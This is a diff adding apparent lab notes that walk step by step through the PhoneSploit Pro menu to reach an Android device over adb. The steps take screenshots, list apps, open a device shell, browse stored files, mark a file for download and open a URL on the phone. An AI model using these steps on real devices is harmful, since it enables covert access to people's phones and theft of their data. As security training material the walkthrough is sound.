@@ -1,0 +1,55 @@
+PhoneSploit-Pro * Linux 
+
+# UseCase: 
+[To exploit the Android Mobile using adb] 
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+$ python3 phonesploitpro.py [to execute]
+
+$ Type 1 and press Enter to select 1. Connect a Device option
+
+$ Enter a phones ip address, type the target Android device's IP address (in this case, 10.10.1.14) and press Enter
+
+$ type 6 and press Enter to choose Get Screenshot
+
+$ Enter location to save all screenshots, Press Enter for default, type /home/attacker/Desktop 
+
+$ At the Main Menu prompt, 
+type 13 and press Enter to choose List Installed AppsAt the Main Menu prompt, type 13 and press Enter to choose List Installed Apps
+
+$ Type 2 and press Enter to List all packages
+
+$ type 10 and press Enter to choose Run an app [we will launch a calculator app]
+
+$ Type 2 and press Enter to Enter Package Name Manually
+
+$ type com.android.calculator2
+
+$ type 14 and press Enter to choose Access Device Shell
+
+$ type pwd and press Enter
+
+$ type ls and press Enter
+
+$ Type cd sdcard
+
+$ Type ls and press Enter
+
+$ Type cd Download and press Enter
+
+$ Type ls and press Enter
+
+$ Note down the location of images.jpeg (in this example, /sdcard/Download/images.jpeg). You can download the file by selecting option 8 in the PhoneSploit Pro main menu options 
+
+$ Type exit and press Enter to exit the shell command line and return to the main menu
+
+$ type N and press Enter
+
+$ type 23 and press Enter to choose Open a Link on Device
+
+$ Enter URL, type the desired URL (in this case, https://pranx.com/hacker/) and press Enter
+
+$ type 27 and press Enter to choose the Get Device Information option
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
